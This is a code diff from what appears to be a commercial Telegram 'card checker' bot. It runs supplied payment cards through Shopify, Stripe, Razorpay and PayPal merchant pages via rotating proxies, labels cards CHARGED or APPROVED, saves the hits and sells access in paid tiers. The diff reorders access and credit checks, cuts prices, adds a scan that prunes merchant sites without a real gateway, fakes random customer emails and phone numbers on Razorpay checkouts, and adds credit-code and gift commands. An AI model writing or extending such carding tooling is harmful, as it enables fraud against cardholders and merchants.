         f" 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{target_username}\n"
         f" 𝙎𝙩𝙖𝙩𝙪𝙨: {status}\n"
@@ -25983,7 +26196,82 @@ async def co_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
     
-    
+
+def check_gateway_access(self, user_id: int, gateway: str) -> Tuple[bool, str, str]:
+    """
+    Return (allowed, reason_code, message).
+
+    reason_code:
+      • "ok"            → allowed
+      • "no_credits"    → free user, 0 credits
+      • "not_in_tier"   → paid user, gateway not in their list
+      • "not_in_free"   → free user has credits but gateway not whitelisted
+      • "unknown_tier"  → fallback
+    """
+    # Owner bypass
+    if user_id == OWNER_ID:
+        return True, "ok", ""
+
+    tier = self.get_tier(user_id)
+    gw = (gateway or "").lower().strip()
+
+    # Paid tiers
+    if tier in ("premium", "ultimate", "admin"):
+        if gw in self.TIERS[tier]["can_access_gateways"]:
+            return True, "ok", ""
+        return (
+            False,
+            "not_in_tier",
+            f"❌ <b>{gateway.replace('_', ' ').title()} not available for "
+            f"{tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+
+    # Free tier
+    if tier == "free":
+        credits = get_user_credits(user_id)
+        if credits <= 0:
+            return (
+                False,
+                "no_credits",
+                "💎 <b>Insufficient Credits!</b>\n\n"
+                "USE /buy TO UPGRADE YOUR TIER 💎"
+            )
+        if gw in self.FREE_TIER_CREDIT_GATEWAYS:
+            return True, "ok", ""
+        return (
+            False,
+            "not_in_free",
+            f"❌ <b>{gateway.replace('_', ' ').title()} not available "
+            f"for FREE tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+
+    return False, "unknown_tier", "❌ Gateway not available."
+
+async def require_gateway_access(user_id: int, gateway: str, message) -> bool:
+    """
+    Returns True if the user can access the gateway.
+    Sends an appropriate error message and returns False otherwise.
+    Does NOT touch credits — that's the caller's job.
+    """
+    allowed, _reason, error_msg = user_manager.check_gateway_access(user_id, gateway)
+    if allowed:
+        return True
+    await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+    return False
+
+
+
+
+
+
+
+
+
+
+
+  
 
 # 
 
@@ -33222,7 +33510,7 @@ PAYMENT_PLANS = {
         "name": "Lite",
         "emoji": "🔥",
         "duration": 7,
-        "price": 7,
+        "price": 5,
         "currency": "USD",
         "tier": "ultimate"
     },
@@ -33507,7 +33795,7 @@ async def pay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [
             InlineKeyboardButton("🔥 Test - $2 (1 Day)", callback_data='pay_plan_test'),
-            InlineKeyboardButton("🔥 Lite - $7 (7 Days)", callback_data='pay_plan_lite')
+            InlineKeyboardButton("🔥 Lite - $5 (7 Days)", callback_data='pay_plan_lite')
         ],
         [
             InlineKeyboardButton("🔥 Crown - $10 (15 Days)", callback_data='pay_plan_crown'),
@@ -33527,7 +33815,7 @@ async def pay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f'╚══════════════════════════╝\n\n'
         f'🎯 <b>Select a plan to upgrade:</b>\n\n'
         f'🔥 <b>Test</b> - $2 (1 Day)\n'
-        f'🔥 <b>Lite</b> - $7 (7 Days)\n'
+        f'🔥 <b>Lite</b> - $5 (7 Days)\n'
         f'🔥 <b>Crown</b> - $10 (15 Days)\n'
         f'🔥 <b>Member</b> - $20 (30 Days)\n\n'
         f'━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
@@ -33655,7 +33943,7 @@ async def pay_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [
                 InlineKeyboardButton("🔥 Test - $2 (1 Day)", callback_data='pay_plan_test'),
-                InlineKeyboardButton("🔥 Lite - $7 (7 Days)", callback_data='pay_plan_lite')
+                InlineKeyboardButton("🔥 Lite - $5 (7 Days)", callback_data='pay_plan_lite')
             ],
             [
                 InlineKeyboardButton("🔥 Crown - $10 (15 Days)", callback_data='pay_plan_crown'),
@@ -33674,7 +33962,7 @@ async def pay_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f'╚══════════════════════════╝\n\n'
             f'🎯 <b>Select a plan to upgrade:</b>\n\n'
             f'🔥 <b>Test</b> - $2 (1 Day)\n'
-            f'🔥 <b>Lite</b> - $7 (7 Days)\n'
+            f'🔥 <b>Lite</b> - $5 (7 Days)\n'
             f'🔥 <b>Crown</b> - $10 (15 Days)\n'
             f'🔥 <b>Member</b> - $20 (30 Days)\n\n'
             f'━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
@@ -34496,7 +34784,7 @@ async def send_plan_purchase_notification_clean(
         "fire": "5471133374264684999",
         "clock": "5262540380301191210",
         "id": "5307905813451397794",
-        "money": "6002386288612653951",
+        "money": "5438548621127615575",
         "receipt": "5226929552319594190",
     }
     
@@ -43436,7 +43724,7 @@ async def paypal_single_check_with_gif(update: Update, context: ContextTypes.DEF
         print(f"❌ Error: {traceback.format_exc()}")
         # Refund credits on error
         add_user_credits(u_id, 1)
-@check_gateway("shopify")        
+@check_gateway("shopify")
 async def single_check_shopify_pool_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Wrapper for /sh command"""
     if not context.args:
@@ -43447,14 +43735,14 @@ async def single_check_shopify_pool_command(update: Update, context: ContextType
             parse_mode=ParseMode.HTML
         )
         return
-    
+
     card_text = " ".join(context.args).strip()
     card = card_formatter.extract_single_card_from_text(card_text)
-    
+
     if not card:
         await update.message.reply_text("❌ Invalid card format.")
         return
-    
+
     await single_check_shopify_pool(update, context, card)
 # ============ UPDATE STATUS COMMAND ============
 
@@ -45253,85 +45541,78 @@ def format_shopify_single_response(result: Dict, card: str, bin_info: tuple) -> 
 @check_gateway("shopify")
 async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
     """
-    Single card check using API pool rotation
-    Automatically rotates between multiple Shopify APIs
+    Single card check using Shopify API pool rotation.
     """
     u_id = update.effective_user.id
     message = update.effective_message
     username = update.effective_user.username or update.effective_user.first_name
-    
-    # ============ FIX: Check credits FIRST (again, as a safety net) ============
-    can_proceed, error_msg = await check_and_deduct_credits(u_id, update, context, is_mass_check=False, card_count=1)
+
+    # ============ STEP 1: GATEWAY ACCESS CHECK (FIRST) ============
+    if not await require_gateway_access(u_id, 'shopify', message):
+        return  # no credits touched
+
+    # ============ STEP 2: DEDUCT CREDITS ============
+    can_proceed, error_msg = await check_and_deduct_credits(
+        u_id, update, context, is_mass_check=False, card_count=1
+    )
     if not can_proceed:
         await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
         return
-    
-    # Initialize checking_msg as None at the start
+
     checking_msg = None
-    
-    # Check gateway access
-    if not user_manager.can_access_gateway(u_id, 'shopify'):
-        tier = user_manager.get_tier(u_id)
-        error_message = (
-            f"❌ <b>Shopify not available for {tier.upper()} tier</b>\n\n"
-            f"USE /buy TO UPGRADE YOUR TIER 💎"
-        )
-        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
-        # Refund credits since gateway not available
-        add_user_credits(u_id, 1)
-        return
-    
+
     try:
-        # Create checking message HERE - inside try block
         checking_msg = await message.reply_text(
             f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking card with Shopify...",
             parse_mode=ParseMode.HTML
         )
-        
+
         tier = user_manager.get_tier(u_id)
-        
+
         # Get a site for this check
         site = autosopi_site_manager.get_next_site_weighted()
         if not site:
             await checking_msg.edit_text("❌ No sites available.")
+            if tier == "free":
+                add_user_credits(u_id, 1)  # refund
             return
-        
+
         # Get proxy if allowed
         proxy_str = None
         if user_manager.can_use_proxy(u_id):
             proxy_str = autosopi_proxy_tracker.get_working_proxy(u_id)
-        
+
         # Check using API pool
         result = await shopify_api_pool.check_card_with_pool(card, site, proxy_str, u_id)
-        
+
         elapsed = result.get("elapsed", 0)
-        
+
         # Get BIN info
         bin_info = await get_bin_info(card)
         bin_info_text, bank, country, currency_code, country_code = bin_info
-        
+
         status_display = result.get("status_display", "❌ DECLINED")
         status_category = result.get("status_category", "declined")
         response_msg = result.get("message", "Unknown")
         price = result.get("price", "0.00")
         gateway_name = result.get("gateway", "Shopify Payments")
         api_used = result.get("api_used", "Unknown API")
-        
+
         # Format price
         try:
             price_float = float(price)
             price_str = f"${price_float:.2f}"
-        except:
+        except Exception:
             price_str = price
-        
+
         # Parse card for display
         card_parts = card.split('|')
         card_num = card_parts[0] if len(card_parts) > 0 else card
         exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
         exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
         cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
-        
-        # Format country with flag
+
+        # Country flag
         country_name = country.replace('🌐', '').strip()
         flag_map = {
             'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
@@ -45342,8 +45623,8 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
             if key in country_name.upper():
                 country_flag = flag
                 break
-        
-        # ============ USE PREMIUM EMOJIS FOR STATUS ============
+
+        # Status emoji
         if status_category == "charged":
             status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
             status_display_clean = "CHARGED"
@@ -45357,8 +45638,7 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
         else:
             status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
             status_display_clean = "DECLINED"
-        
-        # Build output with Premium emojis
+
         output = (
             f"┏━━━━━━━⍟\n"
             f"┃ {status_emoji} {status_display_clean}\n"
@@ -45371,16 +45651,16 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
             f"⌬ 𝐁𝐚𝐧𝐤 ↣ {bank}\n"
             f"⌬ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
         )
-        
+
         # Delete checking message and send result
         if checking_msg:
             try:
                 await checking_msg.delete()
-            except:
+            except Exception:
                 pass
-        
+
         await message.reply_text(output, parse_mode=ParseMode.HTML)
-        
+
         # Save hit if approved/charged
         if status_category in ["charged", "approved"]:
             await save_hit_to_file(
@@ -45388,7 +45668,7 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
                 response=response_msg, price=price_str,
                 bin_info=bin_info, user_id=u_id, user_tier=tier
             )
-            
+
             if status_category == "charged":
                 await send_gif_with_result_combined(
                     update=update, context=context, card=card,
@@ -45396,34 +45676,31 @@ async def single_check_shopify_pool(update: Update, context: ContextTypes.DEFAUL
                     price=price_str, bin_info=bin_info,
                     status_category="charged", username=username
                 )
-                
+
                 user_data = user_manager.get_user(u_id)
                 await send_hit_notification(
                     context=context, gateway=gateway_name,
                     card=card, response=response_msg, price=price_str,
                     user=user_data, bin_info=bin_info, status_category="charged"
                 )
-                
+
                 user_manager.increment_hits(u_id)
-        
+
         user_manager.increment_checks(u_id)
-        
-       
-        
+
     except Exception as e:
-        # SAFE: Only try to delete/update checking_msg if it was created
         if checking_msg:
             try:
                 await checking_msg.delete()
-            except:
+            except Exception:
                 pass
         await message.reply_text(f"❌ Error: {str(e)[:100]}")
         print(f"❌ [Shopify Pool] Error: {traceback.format_exc()}")
-        # Refund credits on error
-        add_user_credits(u_id, 1)
+        # Refund credit on real internal error
+        if user_manager.get_tier(u_id) == "free":
+            add_user_credits(u_id, 1)
     finally:
-        if u_id in shopify_active_tasks:
-            shopify_active_tasks.pop(u_id, None)
+        shopify_active_tasks.pop(u_id, None)
             
             
 # ============ PAYMENT PLANS CONFIGURATION ============
@@ -45445,7 +45722,7 @@ PAYMENT_PLANS = {
         "duration": 7,
         "duration_type": "days",
         "tier": "ultimate",
-        "price": 7,
+        "price": 5,
         "currency": "USD",
         "display_name": "Lɪᴛᴇ",
         "description": "7 Days Access"
@@ -45663,7 +45940,7 @@ async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"<b>ᴘʟᴀɴ 1: Lɪᴛᴇ</b> 🔥\n"
         f"   Aᴄᴄᴇꜱꜱ ➺ Lite\n"
         f"   Sᴘᴀɴ ➺ 7 Dᴀʏꜱ\n"
-        f"   Pʀɪᴄᴇ ➺ $7\n"
+        f"   Pʀɪᴄᴇ ➺ $5\n"
         f"\n\n"
         f"<b>ᴘʟᴀɴ 2: Cʀᴏᴡɴ</b> 🔥\n"
         f"   Aᴄᴄᴇꜱꜱ ➺ Crown\n"
@@ -45771,15 +46048,19 @@ async def buy_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("❌ Invalid plan selected.")
         return
     
+    
+    diamond_emoji = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+    
+    
     plan = PAYMENT_PLANS[plan_key]
     
     message = (
-        f"💎 <b>Selected Plan: {plan['display_name']}</b>\n"
-        f"⏱️ <b>Duration:</b> {plan['duration']} Days\n"
-        f"💰 <b>Price:</b> ${plan['price']} USD\n"
-        f"━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🎯 <b>Select Payment Method:</b>\n"
-        f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+        f"{diamond_emoji} <b>Selected Plan: {plan['display_name']}</b>\n"
+        f"\n"
+        f"<b>Duration:</b> {plan['duration']} Days\n"
+        f"<b>Price:</b> ${plan['price']} USD\n"
+        f"\n"
+        f"<b>Select Payment Method:</b>\n"
     )
     
     keyboard = [
@@ -46321,7 +46602,42 @@ async def handle_payment_proof_message(update: Update, context: ContextTypes.DEF
 
 
             
-   
+async def scanfakes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Scan all sites and remove any that return non-Shopify gateways (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only.")
+        return
+    
+    status_msg = await update.message.reply_text(
+        f"🔍 Scanning {len(autosopi_site_manager.sites)} sites for fake gateways...\n"
+        f"This will take a while."
+    )
+    
+    test_card = "4111111111111111|12|2028|123"
+    removed = []
+    
+    for i, site in enumerate(list(autosopi_site_manager.sites), 1):
+        try:
+            result = await shopify_api_pool.check_card_with_pool(test_card, site, None, OWNER_ID)
+            gateway = result.get("gateway", "Unknown")
+            
+            if not is_real_shopify_gateway(gateway):
+                await remove_fake_gateway_site(site, gateway)
+                removed.append((site, gateway))
+                print(f"🗑️ Removed fake: {site} ({gateway})")
+            
+            await status_msg.edit_text(
+                f"🔍 Scanning... {i}/{len(autosopi_site_manager.sites)}\n"
+                f"🗑️ Removed: {len(removed)}"
+            )
+        except Exception as e:
+            print(f"⚠️ Scan error on {site}: {e}")
+    
+    result_text = f"✅ <b>Scan Complete</b>\n\n🗑️ Removed {len(removed)} fake sites:\n"
+    for site, gw in removed[:20]:
+        result_text += f"  • <code>{site}</code> ({gw})\n"
+    
+    await status_msg.edit_text(result_text, parse_mode=ParseMode.HTML)  
    
 async def toggle_global_mode_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Toggle global proxy only mode (admin only) - /globalmode"""
@@ -48563,7 +48879,7 @@ from urllib.parse import quote
 
 # Razorpay URLs - rotated round-robin per card
 RAZORPAY_URLS = [
-    "https://pages.razorpay.com/eventpay",
+    "https://pages.razorpay.com/instantpayment",
 ]
 
 
@@ -48655,7 +48971,7 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
         "status_display": "⚠️ ERROR",
         "status_category": "error",
         "elapsed": 0,
-        "price": "₹10",
+        "price": "₹300",
         "gateway": "Razorpay"
     }
     
@@ -48797,8 +49113,8 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
                     'line_items': [{'payment_page_item_id': ppid, 'amount': RAZORPAY_AMOUNT}],
                     'customer': {
                         'name': 'Test User',
-                        'email': email,
-                        'contact': phone_short
+                        'email': f"user{random.randint(10000, 99999)}@gmail.com",
+                        "contact": f"9{random.randint(100000000, 999999999)}" 
                     }
                 },
                 headers={
@@ -51039,7 +51355,56 @@ async def stripe_4usd_mass_check_logic(update: Update, context: ContextTypes.DEF
 # Add this near the top of your file, after the other global variables
 
 
-  
+async def remove_fake_gateway_site(site: str, gateway: str, user_id: int = None):
+    """
+    Remove a site from rotation because it uses a fake (non-Shopify) gateway.
+    Also removes it from site_quality_tracker.
+    """
+    print(f"\n{'='*80}")
+    print(f"🗑️ [FAKE GATEWAY REMOVAL]")
+    print(f"   Site: {site}")
+    print(f"   Gateway returned: {gateway}")
+    print(f"{'='*80}\n")
+    
+    try:
+        # Remove from Autosopi rotation
+        if site in autosopi_site_manager.sites:
+            autosopi_site_manager.sites.remove(site)
+            print(f"✅ Removed from autosopi_site_manager.sites")
+        
+        # Remove from site stats/failures
+        if site in autosopi_site_manager.site_stats:
+            del autosopi_site_manager.site_stats[site]
+        if site in autosopi_site_manager.site_failures:
+            del autosopi_site_manager.site_failures[site]
+        if site in autosopi_site_manager.sites_to_remove:
+            autosopi_site_manager.sites_to_remove.discard(site)
+        
+        autosopi_site_manager.save_sites()
+        autosopi_site_manager.reset_rotation()
+        
+        # Remove from site_quality_tracker
+        if site in site_quality_tracker.good_sites:
+            site_quality_tracker.good_sites.discard(site)
+        if site in site_quality_tracker.normal_sites:
+            site_quality_tracker.normal_sites.discard(site)
+        if site in site_quality_tracker.bad_sites:
+            site_quality_tracker.bad_sites.discard(site)
+        if site in site_quality_tracker.site_quality:
+            del site_quality_tracker.site_quality[site]
+        if site in site_quality_tracker.price_cache:
+            del site_quality_tracker.price_cache[site]
+        
+        site_quality_tracker.save_stats()
+        
+        # Remove from site_rotation_manager cache
+        if hasattr(site_rotation_manager, 'cache_time'):
+            site_rotation_manager.cache_time = 0
+        
+        print(f"✅ Site fully removed: {site}")
+        
+    except Exception as e:
+        print(f"⚠️ Error removing fake gateway site {site}: {e}")  
         
         
 # ============ HOUR-BASED KEY SYSTEM ============
@@ -51925,7 +52290,8 @@ def format_stripe_chk_response(result: Dict, card: str, bin_info: tuple) -> Tupl
 @check_gateway("stripe_chk")
 async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Single card check with Stripe Auth gateway - /chk <card>"""
-    
+
+    # ============ BAN CHECK ============
     if update.effective_user:
         user_id = update.effective_user.id
         if user_id != OWNER_ID and ban_manager.is_banned(user_id):
@@ -51935,10 +52301,11 @@ async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_
                 f"If you believe this is a mistake, contact @lencax.",
                 parse_mode=ParseMode.HTML
             )
-            return  # <-- THIS STOPS EXECUTION
+            return
+
     if not await verify_group_access(update, context):
         return
-    
+
     if not context.args:
         await update.message.reply_text(
             "💳 <b>Stripe Auth Single Check</b>\n\n"
@@ -51950,11 +52317,11 @@ async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_
             parse_mode=ParseMode.HTML
         )
         return
-    
+
     user_id = update.effective_user.id
     message = update.effective_message
     card_text = " ".join(context.args).strip()
-    
+
     # Extract card
     card = card_formatter.extract_single_card_from_text(card_text)
     if not card:
@@ -51963,61 +52330,61 @@ async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_
             "Example: 4111111111111111|12|2028|123"
         )
         return
-    
-    # Check credits
-    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+
+    # ============ STEP 1: GATEWAY ACCESS CHECK (FIRST) ============
+    if not await require_gateway_access(user_id, 'stripe_chk', message):
+        return  # no credits touched
+
+    # ============ STEP 2: DEDUCT CREDITS ============
+    can_proceed, error_msg = await check_and_deduct_credits(
+        user_id, update, context, is_mass_check=False, card_count=1
+    )
     if not can_proceed:
         await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
         return
-    
-    # Check gateway access
-    if not user_manager.can_access_gateway(user_id, 'stripe_chk'):
-        tier = user_manager.get_tier(user_id)
-        error_message = (
-            f"❌ <b>Stripe Auth not available for {tier.upper()} tier</b>\n\n"
-            f"USE /buy TO UPGRADE YOUR TIER 💎"
-        )
-        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
-        add_user_credits(user_id, 1)
-        return
-    
+
     stripe_auth_chk_active_tasks[user_id] = True
-    
+
     try:
         tier = user_manager.get_tier(user_id)
         if user_id not in user_speed_controllers:
-            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+            user_speed_controllers[user_id] = SpeedController(
+                TIER_SPEEDS.get(tier, 900), tier
+            )
         speed_controller = user_speed_controllers[user_id]
-        
+
         status_msg = await message.reply_text("🔄 Checking card with Stripe Auth...")
-        
+
         await speed_controller.wait_if_needed()
         start = time.time()
-        
+
         # Get proxy if allowed
         proxy_str = None
         if user_manager.can_use_proxy(user_id):
-            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+            if (
+                user_id in autosopi_proxy_tracker.working_proxies
+                and autosopi_proxy_tracker.working_proxies[user_id]
+            ):
                 proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
                 if proxy_list:
                     proxy_str = proxy_list[0]
                     print(f"🔌 Using proxy: {mask_proxy(proxy_str)}")
-        
+
         result = await check_card_stripe_chk(card, proxy_str, user_id)
-        
+
         elapsed = time.time() - start
         speed_controller.record_response(elapsed)
-        
+
         bin_info = await get_bin_info(card)
-        
+
         try:
             await status_msg.delete()
-        except:
+        except Exception:
             pass
-        
+
         ui, status_category = format_stripe_chk_response(result, card, bin_info)
         await message.reply_text(ui, parse_mode=ParseMode.HTML)
-        
+
         if status_category == "approved":
             await save_hit_to_file(
                 card=card, gateway="Stripe Auth",
@@ -52025,7 +52392,7 @@ async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_
                 price="$0.00",
                 bin_info=bin_info, user_id=user_id, user_tier=tier
             )
-            
+
             user_data = user_manager.get_user(user_id)
             await send_hit_notification(
                 context=context, gateway="Stripe Auth", card=card,
@@ -52034,17 +52401,19 @@ async def single_check_stripe_chk(update: Update, context: ContextTypes.DEFAULT_
                 user=user_data, bin_info=bin_info, status_category="approved"
             )
             user_manager.increment_hits(user_id)
-        
+
         user_manager.increment_checks(user_id)
-        
+
     except Exception as e:
         try:
             await status_msg.delete()
-        except:
+        except Exception:
             pass
         await message.reply_text(f"❌ Error: {str(e)[:100]}")
         print(f"❌ [Stripe CHK] Error: {traceback.format_exc()}")
-        add_user_credits(user_id, 1)
+        # Refund the credit only on real internal error
+        if user_manager.get_tier(user_id) == "free":
+            add_user_credits(user_id, 1)
     finally:
         stripe_auth_chk_active_tasks.pop(user_id, None)
 
@@ -54016,6 +54385,137 @@ async def test_site_with_proxy(site: str, proxy: str = None, timeout: int = 20) 
         
 
 
+async def g_code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Generate N credit keys (100 credits each).
+    Usage: /g_code <count>
+
+    Example: /g_code 4  ->  4 keys, each worth 100 credits
+    """
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+
+    # ---- Parse count ----
+    if not context.args:
+        await update.message.reply_text(
+            "💎 <b>Generate Credit Codes</b>\n\n"
+            "Usage: <code>/g_code &lt;count&gt;</code>\n"
+            "Example: <code>/g_code 4</code>\n\n"
+            "• Each code gives <b>100</b> credits\n"
+            "• Codes expire in <b>30</b> days\n"
+            "• Users claim with <code>/claim &lt;code&gt;</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    try:
+        count = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("❌ Invalid count. Use a number, e.g. /g_code 4")
+        return
+
+    if count < 1 or count > 100:
+        await update.message.reply_text("❌ Count must be between 1 and 100.")
+        return
+
+    # ---- Fixed parameters ----
+    CREDITS_PER_CODE = 100
+    EXPIRY_DAYS = 30
+
+    # ---- Generate keys ----
+    generated_keys = []
+    for _ in range(count):
+        key = generate_credit_key(
+            amount=CREDITS_PER_CODE,
+            created_by=update.effective_user.id,
+            expiry_days=EXPIRY_DAYS
+        )
+        generated_keys.append(key)
+        await asyncio.sleep(0.05)
+        
+        
+    diamond_emoji   = premium_emoji(PREMIUM_EMOJI_IDS.get("diamond", "5427168083074628963"), "💎")
+
+    # ---- Build ONE single message ----
+    header = (
+        f"{diamond_emoji} <a href=\"https://t.me/lencax\">Codes Generated</a>\n"
+        "────────────\n"
+        f"Amount ➳ {count}\n"
+        f"Credits ➳ {CREDITS_PER_CODE}\n\n"
+    )
+
+    # Each key wrapped in <code> so it's monospace + tap-to-copy
+    keys_block = "\n".join(f"<code>{k}</code>" for k in generated_keys)
+
+    footer = "\n\nUse /claim to get your credits."
+
+    full_message = header + keys_block + footer
+
+    await update.message.reply_text(
+        full_message,
+        parse_mode=ParseMode.HTML,
+        disable_web_page_preview=True
+    )
+
+async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Redeem a credit code.
+    Usage: /claim <code>
+    """
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    # Only free users need credits
+    tier = user_manager.get_tier(user_id)
+    if tier != "free":
+        await message.reply_text(
+            f"ℹ️ <b>You don't need credits</b>\n\n"
+            f"Your tier (<b>{tier.upper()}</b>) has unlimited access.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    if not context.args:
+        await message.reply_text(
+            "💎 <b>Claim Credits</b>\n\n"
+            "Usage: <code>/claim &lt;code&gt;</code>\n"
+            "Example: <code>/claim 7E65-4E23-1CA9-43</code>\n\n"
+            f"💰 Your balance: <b>{get_user_credits(user_id)}</b> credits",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    code = context.args[0].strip().upper()
+
+    success, msg, amount = redeem_credit_key(code, user_id)
+
+    if success:
+        new_total = get_user_credits(user_id)
+        await message.reply_text(
+            f"✅ <b>Code Claimed Successfully!</b>\n\n"
+            f"🎉 {msg}\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"💰 Credits Added: <b>+{amount}</b>\n"
+            f"💎 New Balance: <b>{new_total}</b>\n"
+            f"📊 Estimated Checks: <b>{new_total}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"Use /credits to check your balance.",
+            parse_mode=ParseMode.HTML
+        )
+    else:
+        await message.reply_text(
+            f"❌ <b>Claim Failed</b>\n\n"
+            f"{msg}\n\n"
+            f"💰 Current balance: <b>{get_user_credits(user_id)}</b> credits",
+            parse_mode=ParseMode.HTML
+        )
+
+
+
 
 # ============ PRINCESS FOR A DAY PAYPAL GATEWAY (FIXED - NO SSL) ============
 
@@ -55444,7 +55944,7 @@ GIFT_PLANS = {
         "duration_type": "days",
         "tier": "ultimate",
         "display_name": "Lɪᴛᴇ",
-        "price": "$7"
+        "price": "5"
     },
     "crown": {
         "name": "Crown",
@@ -55479,23 +55979,36 @@ GIFT_ALIASES = {
 }
 
 
+
+# ============ GIFT COMMAND (supports names + hours + days) ============
+# Usage examples:
+#   NAMED PLANS:
+#     /gift 6299808404 Test     -> 1 day   ULTIMATE
+#     /gift 6299808404 Lite     -> 7 days  ULTIMATE
+#     /gift 6299808404 Crown    -> 15 days ULTIMATE
+#     /gift 6299808404 Member   -> 30 days ULTIMATE
+#
+#   DURATION FORMAT:
+#     /gift 6299808404 1h        -> 1 hour  ULTIMATE
+#     /gift 6299808404 6h        -> 6 hours ULTIMATE
+#     /gift 6299808404 24h       -> 24 hours ULTIMATE
+#     /gift 6299808404 1d        -> 1 day   ULTIMATE
+#     /gift 6299808404 30d       -> 30 days ULTIMATE
+
 async def gift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Gift a plan to a user - DIRECT UPGRADE (no key required)
-    
-    Plans: Test, Lite, Crown, Member
-    Examples:
-    /gift 6299808404 Test
-    /gift 6299808404 Lite
-    /gift 6299808404 Crown
-    /gift 6299808404 Member
+
+    Accepts EITHER:
+      • A named plan:  Test, Lite, Crown, Member  (or short alias t/l/c/m)
+      • A duration:    <number>h  or  <number>d   (e.g. 1h, 6h, 30d)
     """
-    
+
     if not await verify_group_access(update, context):
         return
-    
+
     user_id = update.effective_user.id
-    
+
     # Only owner can gift plans
     if user_id != OWNER_ID:
         await update.message.reply_text(
@@ -55505,28 +56018,33 @@ async def gift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=back_menu()
         )
         return
-    
+
     # Check arguments
     if len(context.args) < 2:
         await update.message.reply_text(
             "🎁 <b>Gift a Plan</b>\n\n"
-            "Usage: <code>/gift &lt;user_id&gt; &lt;plan&gt;</code>\n\n"
-            "<b>Available Plans:</b>\n"
-            "• <code>Test</code> - 1 Day\n"
-            "• <code>Lite</code> - 7 Days\n"
-            "• <code>Crown</code> - 15 Days\n"
-            "• <code>Member</code> - 30 Days\n\n"
+            "Usage: <code>/gift &lt;user_id&gt; &lt;plan | duration&gt;</code>\n\n"
+            "<b>Named Plans:</b>\n"
+            "  • <code>Test</code>   → 1 day\n"
+            "  • <code>Lite</code>   → 7 days\n"
+            "  • <code>Crown</code>  → 15 days\n"
+            "  • <code>Member</code> → 30 days\n\n"
+            "<b>Custom Duration:</b>\n"
+            "  <code>&lt;number&gt;h</code> = hours\n"
+            "  <code>&lt;number&gt;d</code> = days\n\n"
             "<b>Examples:</b>\n"
-            "<code>/gift 6299808404 Test</code>\n"
-            "<code>/gift 6299808404 Lite</code>\n"
-            "<code>/gift 6299808404 Crown</code>\n"
-            "<code>/gift 6299808404 Member</code>\n\n"
-            "All plans upgrade to <b>ULTIMATE</b> tier.",
+            "  <code>/gift 6299808404 Test</code>\n"
+            "  <code>/gift 6299808404 Crown</code>\n"
+            "  <code>/gift 6299808404 1h</code>\n"
+            "  <code>/gift 6299808404 6h</code>\n"
